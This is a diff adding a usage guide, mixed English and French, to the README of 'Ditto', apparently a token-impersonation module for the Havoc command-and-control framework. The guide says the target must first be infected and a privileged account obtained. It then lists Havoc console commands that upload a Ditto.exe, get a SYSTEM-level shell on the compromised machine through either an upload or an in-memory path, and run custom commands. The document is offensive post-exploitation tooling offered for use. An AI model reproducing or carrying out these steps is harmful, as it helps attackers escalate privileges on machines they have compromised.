@@ -33,3 +33,53 @@ One line appears in script manager tab.
 The Script was load in havoc
 
 # Using guide
+## Prerequire
+
+You need to infect you'r target and you need privileged account before using this module.
+
+![alt text](image.png)
+
+After this Enjoy.
+
+## Upload
+### Etape 1
+
+This command is use to set the local file to upload in your target.
+
+The upload take id of your session.
+
+
+
+``` Havoc
+Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
+```
+
+
+Recupérer shell System :
+```Havoc
+Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
+```
+
+Executer commande personaliser pour Ditto :
+
+``` Havoc
+Ditto-upload Exec help
+```
+
+## In Memory
+### Etape 1
+
+``` Havoc
+Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
+```
+
+Recupérer shell System :
+```Havoc
+Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
+```
+
+Executer commande personaliser pour Ditto :
+
+``` Havoc
+Ditto-Memory Exec help
+```
